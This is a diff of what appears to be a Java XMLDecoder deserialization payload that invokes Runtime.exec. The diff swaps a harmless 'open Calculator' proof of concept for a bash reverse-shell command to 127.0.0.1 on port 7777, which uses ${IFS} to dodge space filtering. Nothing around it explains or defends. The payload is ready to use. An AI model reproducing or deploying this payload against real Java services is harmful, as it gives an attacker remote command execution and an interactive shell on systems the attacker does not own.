@@ -3,15 +3,7 @@
  <object class="java.lang.Runtime" method="getRuntime">
   <void method="exec">
    <array class="java.lang.String" length="3">
-    <void index="0">
-     <string>open</string>
-    </void>
-    <void index="1">
-     <string>-a</string>
-    </void>
-    <void index="2">
-     <string>Calculator</string>
-    </void>
+    <void index="0"><string>bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash${IFS}-i>&amp;/dev/tcp/127.0.0.1/7777&lt;&amp;1</string></void>
    </array>
   </void>
  </object>
